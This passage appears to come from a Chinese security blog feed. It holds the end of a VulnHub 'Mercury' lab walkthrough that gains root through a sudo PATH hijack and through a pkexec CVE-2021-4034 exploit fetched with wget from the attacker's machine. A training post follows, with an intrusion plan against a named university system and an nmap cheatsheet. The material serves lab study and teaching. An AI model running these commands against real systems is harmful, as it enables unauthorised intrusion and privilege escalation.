class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash">webmaster@mercury:~/mercury_proj$ <span class="hljs-built_in">cat</span> /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin<br>syslog:x:104:110::/home/syslog:/usr/sbin/nologin<br>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin<br>tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false<br>uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin<br>tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin<br>landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin<br>pollinate:x:110:1::/var/cache/pollinate:/bin/false<br>sshd:x:111:65534::/run/sshd:/usr/sbin/nologin<br>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin<br>mercury:x:1000:1000:mercury:/home/mercury:/bin/bash<br>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false<br>mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false<br>webmaster:x:1001:1001:,,,:/home/webmaster:/bin/bash<br>linuxmaster:x:1002:1002:,,,:/home/linuxmaster:/bin/bash<br><br>┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==&quot;</span> | <span class="hljs-built_in">base64</span> -d<br>mercurymeandiameteris4880km<br><br>┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK&quot;</span> | <span class="hljs-built_in">base64</span> -d<br>mercuryisthesizeof0.056Earths<br></code></pre></td></tr></table></figure><p>顺便看一眼 passwd 文件，确认 linux_master 是个用户，切换用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">webmaster@mercury:~/mercury_proj$ su linuxmaster<br>Password: <br>linuxmaster@mercury:/home/webmaster/mercury_proj$ <span class="hljs-built_in">cd</span> ~<br>linuxmaster@mercury:~$ <span class="hljs-built_in">ls</span><br>linuxmaster@mercury:~$ <span class="hljs-built_in">ls</span> -liah<br>total 24K<br>162165 drwx------ 3 linuxmaster linuxmaster 4.0K Sep  2  2020 .<br>    18 drwxr-xr-x 5 root        root        4.0K Aug 28  2020 ..<br>165762 lrwxrwxrwx 1 linuxmaster linuxmaster    9 Sep  1  2020 .bash_history -&gt; /dev/null<br>165896 -rw-r--r-- 1 linuxmaster linuxmaster  220 Aug 28  2020 .bash_logout<br>162221 -rw-r--r-- 1 linuxmaster linuxmaster 3.7K Aug 28  2020 .bashrc<br>165920 drwx------ 2 linuxmaster linuxmaster 4.0K Aug 28  2020 .cache<br>166244 -rw-r--r-- 1 linuxmaster linuxmaster  807 Aug 28  2020 .profile<br></code></pre></td></tr></table></figure><h3 id="环境变量与-sudoer-利用"><a href="#环境变量与-sudoer-利用" class="headerlink" title="环境变量与 sudoer 利用"></a>环境变量与 sudoer 利用</h3><p>sudo -l 发现用户有个可以用 root 直接运行的 sh 脚本，而脚本中调用了 tail 命令，这里刚开始没想到提权的方式，用 polkit 进行了提权，在红队笔记的视频中补充了这种提权方式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">linuxmaster@mercury:/home$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> linuxmaster: <br>Matching Defaults entries <span class="hljs-keyword">for</span> linuxmaster on mercury:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User linuxmaster may run the following commands on mercury:<br>    (root : root) SETENV: /usr/bin/check_syslog.sh<br>linuxmaster@mercury:/home$ <span class="hljs-built_in">ls</span> -liah /usr/bin/check_syslog.sh<br>166272 -rwxr-xr-x 1 root root 39 Aug 28  2020 /usr/bin/check_syslog.sh<br>linuxmaster@mercury:/home$ <span class="hljs-built_in">cat</span> /usr/bin/check_syslog.sh<br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">tail</span> -n 10 /var/log/syslog<br>linuxmaster@mercury:/home$ /usr/bin/check_syslog.sh<br><span class="hljs-built_in">tail</span>: cannot open <span class="hljs-string">&#x27;/var/log/syslog&#x27;</span> <span class="hljs-keyword">for</span> reading: Permission denied<br>linuxmaster@mercury:/home$ sudo /usr/bin/check_syslog.sh<br>Jun 15 01:37:12 mercury systemd[4101]: Reached target Sockets.<br>Jun 15 01:37:12 mercury systemd[4101]: Reached target Basic System.<br>Jun 15 01:37:12 mercury systemd[1]: Started User Manager <span class="hljs-keyword">for</span> UID 1001.<br>Jun 15 01:37:12 mercury systemd[1]: Started Session 13 of user webmaster.<br>Jun 15 01:37:12 mercury systemd[4101]: Reached target Main User Target.<br>Jun 15 01:37:12 mercury systemd[4101]: Startup finished <span class="hljs-keyword">in</span> 73ms.<br>Jun 15 01:40:32 mercury systemd-networkd[343]: enp0s3: DHCP: No gateway received from DHCP server.<br>Jun 15 01:40:32 mercury systemd-timesyncd[469]: Network configuration changed, trying to establish connection.<br>Jun 15 01:45:31 mercury systemd-networkd[343]: enp0s3: DHCP: No gateway received from DHCP server.<br>Jun 15 01:45:31 mercury systemd-timesyncd[469]: Network configuration changed, trying to establish connection.<br>linuxmaster@mercury:/home$ <span class="hljs-built_in">id</span><br>uid=1002(linuxmaster) gid=1002(linuxmaster) <span class="hljs-built_in">groups</span>=1002(linuxmaster),1003(viewsyslog)<br><br></code></pre></td></tr></table></figure><p>既然调用了 tail 命令，我们可以利用环境变量和软链接，将 tail 指向 vi，然后按照 <code>sudo -l</code> 中的要求给定环境变量，去执行 sh 脚本，最后利用 vi 中 <code>:!bash</code> 新开启一个交互 shell 即可实现提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">linuxmaster@mercury:~$ <span class="hljs-built_in">ln</span> -s /bin/vi <span class="hljs-built_in">tail</span><br>linuxmaster@mercury:~$ <span class="hljs-built_in">ls</span> -liah<br>total 24K<br>162165 drwx------ 3 linuxmaster linuxmaster 4.0K Jun 15 07:39 .<br>    18 drwxr-xr-x 5 root        root        4.0K Aug 28  2020 ..<br>165762 lrwxrwxrwx 1 linuxmaster linuxmaster    9 Sep  1  2020 .bash_history -&gt; /dev/null<br>165896 -rw-r--r-- 1 linuxmaster linuxmaster  220 Aug 28  2020 .bash_logout<br>162221 -rw-r--r-- 1 linuxmaster linuxmaster 3.7K Aug 28  2020 .bashrc<br>165920 drwx------ 2 linuxmaster linuxmaster 4.0K Aug 28  2020 .cache<br>166244 -rw-r--r-- 1 linuxmaster linuxmaster  807 Aug 28  2020 .profile<br>162271 lrwxrwxrwx 1 linuxmaster linuxmaster    7 Jun 15 07:39 <span class="hljs-built_in">tail</span> -&gt; /bin/vi<br>linuxmaster@mercury:~$ <span class="hljs-built_in">export</span> PATH=.:<span class="hljs-variable">$PATH</span><br>linuxmaster@mercury:~$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games<br>linuxmaster@mercury:~$ sudo --preserve-env=PATH /usr/bin/check_syslog.sh <br>[sudo] password <span class="hljs-keyword">for</span> linuxmaster: <br>2 files to edit<br><br>root@mercury:/home/linuxmaster<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">linuxmaster@mercury:/home$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>     1098    164 -rwsr-xr-x   1 root     root       166056 Feb  3  2020 /usr/bin/sudo<br>      694     88 -rwsr-xr-x   1 root     root        88464 May 28  2020 /usr/bin/gpasswd<br>     1097     68 -rwsr-xr-x   1 root     root        67816 Apr  2  2020 /usr/bin/su<br>      571     52 -rwsr-xr-x   1 root     root        53040 May 28  2020 /usr/bin/chsh<br>      842     44 -rwsr-xr-x   1 root     root        44784 May 28  2020 /usr/bin/newgrp<br>      828     56 -rwsr-xr-x   1 root     root        55528 Apr  2  2020 /usr/bin/mount<br>      565     84 -rwsr-xr-x   1 root     root        85064 May 28  2020 /usr/bin/chfn<br>      497     56 -rwsr-sr-x   1 daemon   daemon      55560 Nov 12  2018 /usr/bin/at<br>      896     32 -rwsr-xr-x   1 root     root        31032 Aug 16  2019 /usr/bin/pkexec<br>     1167     40 -rwsr-xr-x   1 root     root        39144 Apr  2  2020 /usr/bin/umount<br>      676     40 -rwsr-xr-x   1 root     root        39144 Mar  7  2020 /usr/bin/fusermount<br>      875     68 -rwsr-xr-x   1 root     root        68208 May 28  2020 /usr/bin/passwd<br>     1381     16 -rwsr-xr-x   1 root     root        14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device<br>     1374     52 -rwsr-xr--   1 root     messagebus    51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>     1586    464 -rwsr-xr-x   1 root     root         473576 May 29  2020 /usr/lib/openssh/ssh-keysign<br>     1596     24 -rwsr-xr-x   1 root     root          22840 Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1<br></code></pre></td></tr></table></figure><h3 id="Linux-Polkit-权限提升漏洞CVE-2021-4034"><a href="#Linux-Polkit-权限提升漏洞CVE-2021-4034" class="headerlink" title="Linux Polkit 权限提升漏洞CVE-2021-4034"></a>Linux Polkit 权限提升漏洞CVE-2021-4034</h3><p>看到 policykit-agent-helper-1 和 pkexec，可以尝试 <code>CVE-2021-4034</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash">linuxmaster@mercury:/tmp$ wget http://192.168.56.106:8088/exploit<br>--2023-06-15 02:11:03--  http://192.168.56.106:8088/exploit<br>Connecting to 192.168.56.106:8088... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 4442423 (4.2M) [application/octet-stream]<br>Saving to: ‘exploit’<br><br>exploit                      100%[==============================================&gt;]   4.24M  --.-KB/s    <span class="hljs-keyword">in</span> 0.04s   <br><br>2023-06-15 02:11:03 (118 MB/s) - ‘exploit’ saved [4442423/4442423]<br><br>linuxmaster@mercury:/tmp$ <span class="hljs-built_in">ls</span><br>exploit<br>systemd-private-45c1fa3565004439b6a6c8b9e9d5799b-systemd-logind.service-wwncgi<br>systemd-private-45c1fa3565004439b6a6c8b9e9d5799b-systemd-resolved.service-4UEN1e<br>systemd-private-45c1fa3565004439b6a6c8b9e9d5799b-systemd-timesyncd.service-yQdfjg<br>linuxmaster@mercury:/tmp$ <span class="hljs-built_in">chmod</span> +x exploit <br>linuxmaster@mercury:/tmp$ ./exploit <br>2023/06/15 02:11:17 CMDTOEXECUTE is empty fallback to default value<br>2023/06/15 02:11:17 Executing <span class="hljs-built_in">command</span> sh<br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),1002(linuxmaster),1003(viewsyslog)<br><span class="hljs-comment"># whoami</span><br>root<br><span class="hljs-comment"># cd /root</span><br><span class="hljs-comment"># ls</span><br>root_flag.txt<br><span class="hljs-comment"># cat root_flag.txt</span><br>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@<br>@@@@@@@@@@@@@@@@@@@/<span class="hljs-comment">##////////@@@@@@@@@@@@@@@@@@@@</span><br>@@@@@@@@@@@@@@(((/(*(/((((((////////&amp;@@@@@@@@@@@@@<br>@@@@@@@@@@@((#(#(###((##//(((/(/(((*((//@@@@@@@@@@<br>@@@@@@@@/#(((#((((((/(/,*/(((///////(/*/*/#@@@@@@@<br>@@@@@@*((####((///*//(///*(/*//((/(((//**/((&amp;@@@@@<br>@@@@@/(/(((##/*((//(#(////(((((/(///(((((///(*@@@@<br>@@@@/(//((((#(((((*///*/(/(/(((/((////(/*/*(///@@@<br>@@@//**/(/(#(#(##((/(((((/(**//////////((//((*/#@@<br>@@@(//(/((((((#((((#*/((///((///((//////(/(/(*(/@@<br>@@@((//((((/((((#(/(/((/(/(((((#((((((/(/((/////@@<br>@@@(((/(((/##((#((/*///((/((/((##((/(/(/((((((/*@@<br>@@@(((/(##/#(((##((/((((((/(##(/##(#((/((((#((*%@@<br>@@@@(///(#(((((#(#(((((#(//((#((###((/(((((/(//@@@<br>@@@@@(/*/(##(/(###(((#((((/((####/((((///((((/@@@@<br>@@@@@@%//((((#############((((/((/(/(*/(((((@@@@@@<br>@@@@@@@@%#(((############(##((#((*//(/(*//@@@@@@@@<br>@@@@@@@@@@@/(#(####(###/((((((#(///((//(@@@@@@@@@@<br>@@@@@@@@@@@@@@@(((###((#(#(((/((///*@@@@@@@@@@@@@@<br>@@@@@@@@@@@@@@@@@@@@@@@%#(#%@@@@@@@@@@@@@@@@@@@@@@<br>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@<br><br>Congratulations on completing Mercury!!!<br>If you have any feedback please contact me at SirFlash@protonmail.com<br>[root_flag_69426d9fda579afbffd9c2d47ca31d90]<br></code></pre></td></tr></table></figure><p>到这里，提权结束</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">linuxmaster@mercury:/usr/share$ find / -<span class="hljs-built_in">type</span> f -writable -not -path <span class="hljs-string">&quot;/sys*&quot;</span> -not -path <span class="hljs-string">&quot;/proc*&quot;</span> 2&gt;/dev/null<br>/home/linuxmaster/.bashrc<br>/home/linuxmaster/.bash_logout<br>/home/linuxmaster/.profile<br>/home/linuxmaster/.cache/motd.legal-displayed<br></code></pre></td></tr></table></figure><h3 id="polkit-agent-helper-1-提权"><a href="#polkit-agent-helper-1-提权" class="headerlink" title="polkit-agent-helper-1 提权"></a>polkit-agent-helper-1 提权</h3><p>尝试上次红队笔记用的 helper 提权，但是授权用户是 mercury，因此无法直接提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">linuxmaster@mercury:/usr/share$ systemd-run -t bash<br>==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ===<br>Authentication is required to manage system services or other units.                                                <br>Authenticating as: mercury<br>Password: <br>polkit-agent-helper-1: pam_authenticate failed: Authentication failure<br>==== AUTHENTICATION FAILED ===<br>Failed to start transient service unit: Access denied<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2023/06/9dfa91b67af1.html"/>
    <url>/2023/06/9dfa91b67af1.html</url>
    
    <content type="html"><![CDATA[<h1 id="安全实战培训"><a href="#安全实战培训" class="headerlink" title="安全实战培训"></a>安全实战培训</h1><h2 id="第一课"><a href="#第一课" class="headerlink" title="第一课"></a>第一课</h2><p>在合规情况下，给出一个测试目标（单位：北邮，靶标：运维系统），请给出渗透思路。</p><p>首先是做信息收集：</p><ul><li>从北邮的校园网站开始，获取学校的基本信息，建立起对目标的基本认识</li><li>借助于多个在线工具，获取 WHOIS 信息、DNS 历史解析信息、相关 IP 段等信息，多渠道对比验证，确定目标的真实 IP</li><li>对子域名信息进行采集</li><li>敏感信息收集。通过 FOFA、SHADON 等搜索引擎搜索北邮的网络资产、后台管理界面等等，借助于 Google 搜索北邮的学号、系统、VPN、后台、文件等等资产信息</li><li>确定目标后，根据已有的信息可以尝试钓鱼、弱密码等。充分北邮的学号信息、默认密码信息等信息</li><li>对各个子域名和后台登录界面进行渗透测试，使用内部虚拟机和梯子，连接国外的 VPS 进行操作，防止被 WAF 拦截可以使用代理池</li><li>登录成功后收集一波信息，然后考虑如何 getshell，看是否有登录平台存在解析和反序列化漏洞或者常见其他的漏洞</li><li>getshell 后使用 fscan 进行内网的信息收集，确定网络的拓扑结构，进一步寻找运维系统所在。之后进行内网的横向移动和提权等操作。</li></ul><h2 id="第二课"><a href="#第二课" class="headerlink" title="第二课"></a>第二课</h2><p>本次任务：</p><p>1、搭建burpsuit;java</p><p>2、观察分析 http 请求，http 状态码</p><p>分别代表什么；</p><p>3、nmap、fscan 的使用（内网对自己的目标使用）</p><p>一、</p><p><img src="/pic/fb0a363df16107f538e6349216ceebe7_MD5.png"></p><p>二、</p><p>http 请求</p><ol><li><p>请求行：<br>请求行包含了请求的方法、目标URL和所使用的HTTP协议版本。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/api/users</span> <span class="hljs-meta">HTTP/1.1</span><br></code></pre></td></tr></table></figure><ul><li>GET: 请求方法，指示客户端要获取指定URL的资源。</li><li>&#x2F;api&#x2F;users: 请求的路径和资源。在此示例中，请求的是 <code>/api/users</code> 路径下的资源。</li><li>HTTP&#x2F;1.1: 所使用的HTTP协议版本。</li></ul></li><li><p>请求头：<br>请求头包含了额外的信息和元数据，用于描述请求的细节和要求。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Host</span>: example.com<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">93</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4577</span>.<span class="hljs-number">82</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: application/json<br></code></pre></td></tr></table></figure><ul><li>Host: 指定服务器的主机名或IP地址，用于告知服务器请求的目标主机。</li><li>User-Agent: 标识发送请求的用户代理（浏览器或其他客户端应用程序）的信息。</li><li>Accept: 告知服务器客户端所能够接受的响应内容类型。在此示例中，客户端可以接受JSON格式的响应。</li></ul></li><li><p>请求体（Body）：<br>请求体包含了实际的请求数据，通常用于POST、PUT等请求方法。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">Content</span>-Type: application/json<br>Content-Length: <span class="hljs-number">35</span><br><br>&#123;&quot;name&quot;: <span class="hljs-string">&quot;John Doe&quot;</span>, <span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">30</span>&#125;<br></code></pre></td></tr></table></figure><ul><li>Content-Type: 指定请求体中的数据类型。在此示例中，数据以JSON格式编码。</li><li>Content-Length: 请求体的长度，以字节为单位。</li><li>请求体内容：包含了实际的请求数据。在此示例中，请求体包含了一个JSON对象，包含了名为”name”的字段和名为”age”的字段。</li></ul></li></ol><p>这些字段共同构成了一个完整的HTTP请求，通过它们，客户端向服务器发送请求，并传递所需的信息、参数和数据。服务器根据这些字段来理解和处理请求，然后返回相应的响应给客户端。</p><p>http 状态码：</p><ol><li>200 OK： 表示请求成功。服务器成功处理了客户端的请求，并返回了请求的资源。</li><li>201 Created： 表示请求已成功处理，并在服务器上创建了新的资源。</li><li>204 No Content： 表示请求已成功处理，但服务器没有返回任何内容。一般在不需要返回响应主体的情况下使用，例如删除操作。  </li><li>400 Bad Request： 表示服务器无法理解客户端发送的请求。可能是请求语法错误、参数错误等。</li><li>401 Unauthorized： 表示请求要求身份验证。客户端必须提供有效的身份验证凭据才能访问受保护的资源。</li><li>403 Forbidden： 表示服务器理解请求，但拒绝执行。客户端没有访问请求的资源的权限。</li><li>404 Not Found： 表示请求的资源不存在。服务器无法找到请求的资源。</li><li>500 Internal Server Error： 表示服务器遇到了意外的错误，导致无法完成请求。</li><li>503 Service Unavailable： 表示服务器暂时无法处理请求，通常是由于服务器过载或维护。</li></ol><p>三、</p><p>nmap cheatsheet</p><table><thead><tr><th align="left"></th><th align="left"></th></tr></thead><tbody><tr><td align="left">nmap –min-rate 5000 -p- 192.168.1.1</td><td align="left">扫描存活的TCP端口</td></tr><tr><td align="left">nmap -iL target.txt</td><td align="left">扫描文件中的目标</td></tr><tr><td align="left">nmap –exclude 192.168.1.1</td><td align="left">排除列出的主机</td></tr><tr><td align="left">nmap -sT 192.168.1.1</td><td align="left">TCP 连接端口扫描</td></tr><tr><td align="left">nmap -sU 192.168.1.1</td><td align="left">UDP 端口扫描</td></tr><tr><td align="left">nmap 192.168.1.1 –top-ports 2000</td><td align="left">扫描前2000个端口</td></tr><tr><td align="left">nmap 192.168.1.1 -sV -p 22</td><td align="left">端口上运行的服务的版本</td></tr><tr><td align="left">nmap 192.168.1.1 -O</td><td align="left">使用 TCP&#x2F;IP 进行远程 OS 指纹识别</td></tr><tr><td align="left">nmap –proxies <a href="http://191.1.1.1:1080,http://192.2.2.2:1080">http://191.1.1.1:1080,http://192.2.2.2:1080</a> 192.168.1.1</td><td align="left">通过HTTP&#x2F;SOCKS4代理中继连接</td></tr><tr><td align="left">nmap -D 10.1.1.1,20.2.2.2 192.168.1.1</td><td align="left">使用-D 选项就可以达到 IP 欺骗的目的</td></tr><tr><td align="left">nmap 192.168.1.1 -sC</td><td align="left">使用默认的 NSE 脚本进行扫描</td></tr><tr><td align="left">nmap 192.168.1.1 –script&#x3D;vuln</td><td align="left">扫描常见漏洞</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.1.1.138<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-16 22:28 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> nyx.zte.com.cn (192.1.1.138)<br>Host is up (0.00020s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 00:0C:29:A7:F7:7B (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 2.05 seconds<br>                                                                                                                    <br>┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -O -sC -p22,80 192.1.1.138<br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-16 22:28 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> nyx.zte.com.cn (192.1.1.138)<br>Host is up (0.00047s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 <span class="hljs-built_in">fc</span>:8b:87:f4:36:<span class="hljs-built_in">cd</span>:7d:0f:d8:f3:16:15:a9:47:f1:0b (RSA)<br>|   256 b4:5c:08:96:02:c6:a8:0b:01:fd:49:68:<span class="hljs-built_in">dd</span>:aa:fb:3a (ECDSA)<br>|_  256 cb:bf:22:93:69:76:60:a4:7d:c0:19:f3:c7:15:e7:3c (ED25519)<br>80/tcp open  http    Apache httpd 2.4.38 ((Debian))<br>|_http-title: nyx<br>|_http-server-header: Apache/2.4.38 (Debian)<br>MAC Address: 00:0C:29:A7:F7:7B (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: 